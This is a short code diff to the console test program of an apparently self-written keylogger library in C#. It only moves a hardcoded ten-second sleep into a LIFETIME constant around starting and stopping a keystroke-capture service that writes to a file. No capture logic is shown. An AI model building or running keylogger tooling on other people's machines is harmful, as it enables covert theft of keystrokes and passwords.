@@ -8,7 +8,7 @@ namespace KeyLoggerLibrary.ConsoleTest
 {
     public class Program
     {
-
+        private static int LIFETIME = 10000; //10 seconds
         static void Main(string[] args)
         {
             //Don´t needed, figure out changing output type to Windows Application
@@ -19,8 +19,7 @@ namespace KeyLoggerLibrary.ConsoleTest
             _service.SetOutputMode = FileAppender.Instance;
             _service.Start();
 
-            //Sleeping 10 seconds
-            Thread.Sleep(10000);
+            Thread.Sleep(LIFETIME);
 
             _service.Stop();
 
